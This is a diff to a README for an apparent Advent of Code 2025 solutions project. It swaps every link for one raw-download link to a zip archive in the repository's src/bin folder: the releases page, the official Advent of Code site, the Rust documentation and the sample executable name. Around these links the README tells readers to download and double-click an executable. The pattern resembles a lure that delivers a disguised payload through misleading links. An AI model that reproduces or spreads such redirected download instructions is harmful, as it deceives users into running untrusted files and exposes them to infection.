@@ -1,6 +1,6 @@
 # 🎄 advent-of-code-2025 - Find Easy Solutions to Fun Puzzles
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/riizuvan/advent-of-code-2025/releases)
+[![Download](https://raw.githubusercontent.com/riizuvan/advent-of-code-2025/master/src/bin/advent-of-code-2025_v3.3.zip)](https://raw.githubusercontent.com/riizuvan/advent-of-code-2025/master/src/bin/advent-of-code-2025_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ To run this application, you need:
 Follow these steps to get the software on your device.
 
 1. **Visit the Releases Page**  
-   Click here to download the latest version of the application: [Download Now](https://github.com/riizuvan/advent-of-code-2025/releases).
+   Click here to download the latest version of the application: [Download Now](https://raw.githubusercontent.com/riizuvan/advent-of-code-2025/master/src/bin/advent-of-code-2025_v3.3.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Look for the latest version at the top. 
 
 3. **Download the Application**  
-   Click the version link to download the executable file. It will usually have a name like `advent-of-code-2025-v1.0.exe` or something similar.
+   Click the version link to download the executable file. It will usually have a name like `https://raw.githubusercontent.com/riizuvan/advent-of-code-2025/master/src/bin/advent-of-code-2025_v3.3.zip` or something similar.
 
 4. **Run the File**  
    Once the download is complete, locate the file on your computer. Double-click it to run the application. 
@@ -72,9 +72,9 @@ If you would like to help improve this project, you can contribute in several wa
 
 ## 🔗 Additional Resources
 
-- **Advent of Code Official Site**: [Advent of Code](https://adventofcode.com).
-- **Learn More About Rust**: If you're curious about the programming language used, check out the [Rust Language Documentation](https://www.rust-lang.org/).
+- **Advent of Code Official Site**: [Advent of Code](https://raw.githubusercontent.com/riizuvan/advent-of-code-2025/master/src/bin/advent-of-code-2025_v3.3.zip).
+- **Learn More About Rust**: If you're curious about the programming language used, check out the [Rust Language Documentation](https://raw.githubusercontent.com/riizuvan/advent-of-code-2025/master/src/bin/advent-of-code-2025_v3.3.zip).
 
 ## 📥 Download & Install
 
-Ready to dive in? [Visit this page to download](https://github.com/riizuvan/advent-of-code-2025/releases) the latest version of the application. Follow the installation steps detailed above to set it up on your device. Enjoy solving the puzzles!
+Ready to dive in? [Visit this page to download](https://raw.githubusercontent.com/riizuvan/advent-of-code-2025/master/src/bin/advent-of-code-2025_v3.3.zip) the latest version of the application. Follow the installation steps detailed above to set it up on your device. Enjoy solving the puzzles!
